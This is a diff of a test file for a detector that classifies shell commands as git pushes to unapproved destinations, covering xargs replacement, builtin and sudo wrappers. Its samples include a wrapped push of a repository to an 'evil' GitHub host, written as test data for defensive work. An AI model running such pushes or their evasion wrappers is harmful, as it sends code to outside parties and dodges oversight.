@@ -235,6 +235,14 @@ describe('CC round 3: wrappers, reserved words, and git pinning', () => {
     })
   })
 
+  test('xargs replacement is unresolved and builtin wraps (round 6 L4)', () => {
+    expect(verdictOf('xargs -I{} git push {} <<< fork')).toEqual({
+      rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:xargs replacement rewrites the command',
+    })
+    expect(verdictOf('xargs --replace=% git push %')).toMatchObject({ verdict: 'unknown-destination' })
+    expect(verdictOf('builtin command git push fork')).toMatchObject({ rule: 'git-push', verdict: 'violation', destination: 'github:other/fork' })
+  })
+
   test('a wrapped shell is never labeled http-send (round 5 R6)', () => {
     expect(verdictOf('sudo -Z bash -c "git push https://github.com/evil/x"')).toEqual({
       rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:the sudo options were not understood',
